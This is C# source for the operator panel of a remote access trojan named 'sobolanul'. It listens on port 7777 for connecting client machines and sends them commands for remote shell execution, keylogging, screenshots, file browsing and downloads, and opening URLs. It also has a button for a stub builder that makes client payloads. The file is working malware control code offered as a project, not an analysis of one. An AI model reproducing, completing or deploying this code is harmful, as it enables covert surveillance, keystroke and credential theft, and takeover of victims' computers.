using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml.Linq;
using Windows.Foundation.Metadata;

namespace sobolanul_server
{
    public partial class MainForm : Form
    {
        
        // <k,v> pairs
        private Dictionary<string, TcpClient> clients = new Dictionary<string, TcpClient>();
        private Dictionary<string, string> pcNames = new Dictionary<string, string>();
        private Dictionary<string, FileExplorerForm> fileManagerForms = new Dictionary<string, FileExplorerForm>();

        private TcpListener listener;
        private Thread listenThread;
        private bool consoleVisible = false;

        public MainForm()
        {
            InitializeComponent();
            ApplyRoundedCorners();
            consolePanel.Visible = false;
            listenThread = new Thread(StartListening) { IsBackground = true };
            listenThread.Start();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
        }

        private void StartListening()
        {
            // a server that waits for connections, listen on a custom port like "7777" and when a client tries to connect
            // it accepts the connection
            listener = new TcpListener(IPAddress.Any, 7777);
            listener.Start();
            Log("Server started, waiting for connections...");

            while (true)
            {
                // when the connection arrives, server accepts the client.

                // it takes the client ip address and saves it in clients dictionary
                TcpClient client = listener.AcceptTcpClient();

                string clientIP = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString(); /* ********************************** */
                
                clients[clientIP] = client;
                Log($"Client connected: {clientIP}");
                RefreshClientList();
                // creates a thread that will take care of that client 
                new Thread(() => HandleClient(client, clientIP)) { IsBackground = true }.Start();
            }
        }
        


        private void HandleClient(TcpClient client, string clientIP)
        {
            NetworkStream stream = client.GetStream();
            byte[] buffer = new byte[65536];
            StringBuilder receivedData = new StringBuilder();

            try
            {
                while (true)
                {
                    int bytesRead = stream.Read(buffer, 0, buffer.Length);
                    if (bytesRead == 0) break;

                    receivedData.Append(Encoding.UTF8.GetString(buffer, 0, bytesRead));
                    // process the message once the closing tags show up
                    if (receivedData.ToString().Contains("</execute>")
                     || receivedData.ToString().Contains("</log>")
                     || receivedData.ToString().Contains("</keylogger>")
                     || receivedData.ToString().Contains("</screenshot>")
                     || receivedData.ToString().Contains("</screenshotResponse>")
                     || receivedData.ToString().Contains("</displays>")
                     || receivedData.ToString().Contains("</info>")
                     || receivedData.ToString().Contains("</dirlist>")
                     || receivedData.ToString().Contains("</filedata>"))
                    {
                        string message = receivedData.ToString();
                        receivedData.Clear();
                        ProcessReceivedMessage(client, clientIP, message);
                    }
                }
            }
            catch
            {
                Log($"Client disconnected: {clientIP}");
            }
            finally
            {
                clients.Remove(clientIP);
                client.Close();
                RefreshClientList();
            }
        }
        // xml is used to send and read data
        private void ProcessReceivedMessage(TcpClient client, string clientIP, string message)
        {
            try
            {
                XDocument xml = XDocument.Parse(message);
                if (xml.Root != null)
                {
                    string output = (xml.Root.FirstNode is XCData cdata) ? cdata.Value : xml.Root.Value;

                    switch (xml.Root.Name.LocalName)
                    {
                        case "log":
                            Log($"[{clientIP}] Log: {output}");
                            break;

                        case "execute":
                            Log($"[{clientIP}] Command executed successfully.");
                            Log($"[{clientIP}] Output:\n" + xml.Root.Value.Replace("\n", Environment.NewLine));
                            break;

                        case "keylogger":
                            Log($"[{clientIP}] Keylog:\n{output}");
                            break;

                        case "displays":
                            Console.WriteLine("displays");
                            ParseDisplayList(clientIP, xml.Root);
                            break;

                        case "screenshotResponse":
                            string base64 = xml.Root.Value;
                            byte[] pngBytes = Convert.FromBase64String(base64);

                            Invoke(new Action(() =>
                            {
                                ScreenshotForm form = new ScreenshotForm(pngBytes);
                                form.Show();
                            }));
                            break;

                        case "info":
                            pcNames[clientIP] = output;
                            Log($"[{clientIP}] reported PC name: {output}");

                            RefreshClientList();
                            break;
                        case "dirlist":
                            ParseDirList(clientIP, xml.Root);
                            break;

                        case "filedata":
                            ParseFileData(clientIP, xml.Root);
                            break;


                    }
                }
            }
            catch (Exception ex)
            {
                Log($"[{clientIP}] Error parsing XML message: {ex.Message}");
            }
        }

        private void ParseDisplayList(string clientIP, XElement root)
        {
            var displayElements = root.Elements("display");
            List<string> resolutionList = new List<string>();

            foreach (var de in displayElements)
            {
                string res = de.Value; // eg "1920x1080"
                resolutionList.Add(res);
            }

            // skip if there's just 1 display available
            if (resolutionList.Count == 1)
            {
                Log($"[{clientIP}] Only one display found, capturing index=0...");
                SendDataToClient(clientIP, "<screenshot index=\"0\"></screenshot>");
            }
            else
            {
                Invoke(new Action(() =>
                {
                    var form = new DisplayListForm(clientIP, resolutionList.ToArray(), (cmd) =>
                    {
                        SendDataToClient(clientIP, cmd);
                    });
                    form.ShowDialog();
                }));
            }
        }
        

        private void ParseDirList(string clientIP, XElement root)
        {
            // eg <dirlist><folder name="Downloads" /><file name="firefox.exe" size="500" /></dirlist>
            var folders = root.Elements("folder");
            var files = root.Elements("file");
            List<(string name, bool isFolder, long size)> items = new List<(string, bool, long)>();

            foreach (var fd in folders)
            {
                string fname = fd.Attribute("name").Value;
                items.Add((fname, true, 0));
            }
            foreach (var fl in files)
            {
                string fname = fl.Attribute("name").Value;
                long size = long.Parse(fl.Attribute("size").Value);
                items.Add((fname, false, size));
            }

            if (fileManagerForms.TryGetValue(clientIP, out var fm))
            {
                fm.Invoke(new Action(() =>
                {
                    fm.PopulateList(items);
                }));
            }
        }

        private void ParseFileData(string clientIP, XElement root)
        {
            string base64 = root.Value;
            XAttribute nameAttr = root.Attribute("name");
            string fileName = nameAttr != null ? nameAttr.Value : "download";
            byte[] fileBytes = Convert.FromBase64String(base64);

            Invoke(new Action(() =>
            {
                using (SaveFileDialog sfd = new SaveFileDialog())
                {
                    sfd.FileName = fileName;
                    sfd.Filter = "All Files|*.*";
                    if (sfd.ShowDialog() == DialogResult.OK)
                    {
                        File.WriteAllBytes(sfd.FileName, fileBytes);
                        Log($"Saved file to {sfd.FileName}");
                    }
                }
            }));
        }

        private void RefreshClientList()
        {
            Invoke(new Action(() =>
            {
                clientsPanel.Controls.Clear();
                foreach (var client in clients.Keys)
                {
                    AddClientUI(client);
                }
            }));
        }

        private void AddClientUI(string clientIP)
        {
            Panel clientContainer = new Panel
            {
                Width = clientsPanel.Width - 20,
                Height = 60,
                BackColor = Color.FromArgb(20, 23, 40),
                Padding = new Padding(5),
                Margin = new Padding(5),
                BorderStyle = BorderStyle.None
            };

            clientContainer.Region = Region.FromHrgn(WinApi.CreateRoundRectRgn(
                0, 0,
                clientContainer.Width,
                clientContainer.Height,
                20, 20
            ));

            string pcName = "Unknown";
            if (pcNames.TryGetValue(clientIP, out var nameFromClient))
            {
                pcName = nameFromClient;
            }

            Label clientInfo = new Label
            {
                Text = $"IP: {clientIP}\nPC: {pcName}",
                AutoSize = true,
                Location = new Point(10, 15),
                Font = new Font("Arial", 10, FontStyle.Bold),
                ForeColor = Color.White
            };

            ContextMenuStrip menu = new ContextMenuStrip();
            menu.Items.Add("Send Command", null, (s, e) => SendCommand(clientIP));
            menu.Items.Add("Toggle Keylogger", null, (s, e) => ToggleKeylogger(clientIP));
            menu.Items.Add("Displays", null, (s, e) => SendDataToClient(clientIP, "<displays></displays>"));
            menu.Items.Add("Screenshot Primary", null, (s, e) => SendDataToClient(clientIP, "<screenshot index=\"0\"></screenshot>"));
            menu.Items.Add("File Manager", null, (s, e) => OpenFileManager(clientIP));
            menu.Items.Add("Open URL", null, (s, e) => OpenUrlOnClient(clientIP));
            menu.Items.Add("Exit", null, (s, e) => ExitClient(clientIP));
            clientContainer.ContextMenuStrip = menu;

            clientContainer.Controls.Add(clientInfo);
            clientsPanel.Controls.Add(clientContainer);
        }

        private void OpenUrlOnClient(string clientIP)
        {
            string url = Microsoft.VisualBasic.Interaction.InputBox("Enter URL:", "Open URL", "https://umfst.ro");
            if (string.IsNullOrWhiteSpace(url)) return;

            string command = $"<openurl>{url}</openurl>";
            SendDataToClient(clientIP, command);
        }


        private void OpenFileManager(string clientIP)
        {
            if (!fileManagerForms.TryGetValue(clientIP, out var fm))
            {
                fm = new FileExplorerForm(clientIP, this);
                fileManagerForms[clientIP] = fm;
                fm.Show();
            }
            else
            {
                fm.BringToFront();
            }
        }



        private void ExitClient(string clientIP)
        {
            if (!clients.ContainsKey(clientIP)) return;
            Log($"[{clientIP}]: Exiting client");
            SendDataToClient(clientIP, "<exit></exit>");
        }

        private void SendCommand(string clientIP)
        {
            if (!clients.ContainsKey(clientIP)) return;
            string command = Microsoft.VisualBasic.Interaction.InputBox("Enter command:", "Send Command", "");
            if (string.IsNullOrWhiteSpace(command)) return;

            Log($"[{clientIP}] Sending command: {command}");
            string formattedCommand = $"<execute>{command}</execute>";
            SendDataToClient(clientIP, formattedCommand);
        }

        private void ToggleKeylogger(string clientIP)
        {
            if (!clients.ContainsKey(clientIP)) return;
            SendDataToClient(clientIP, "<keylogger></keylogger>");
        }

        public void SendDataToClient(string clientIP, string data)
        {
            if (!clients.ContainsKey(clientIP)) return;

            NetworkStream stream = clients[clientIP].GetStream();
            byte[] buffer = Encoding.UTF8.GetBytes(data);
            stream.Write(buffer, 0, buffer.Length);
            stream.Flush();
        }

        private void Log(string message)
        {
            Invoke(new Action(() =>
            {
                consoleTextBox.AppendText(message + Environment.NewLine);
            }));
        }

        private void toggleConsoleButton_Click(object sender, EventArgs e)
        {
            consoleVisible = !consoleVisible;
            if (consoleVisible)
            {
                this.Height += 200;
                consolePanel.Visible = true;
            }
            else
            {
                this.Height -= 200;
                consolePanel.Visible = false;
            }

            ApplyRoundedCorners();
        }

        private void ApplyRoundedCorners()
        {
            this.Region = Region.FromHrgn(WinApi.CreateRoundRectRgn(
                0, 0,
                this.Width,
                this.Height,
                20, 20
            ));
        }

        private void StubBuilder_Click(object sender, EventArgs e)
        {
            BuilderForm bf = new();
            bf.Show();
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            WinApi.ReleaseCapture();
            WinApi.SendMessage(this.Handle, WinApi.WM_NCLBUTTONDOWN, WinApi.HT_CAPTION, 0);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }
    }
}
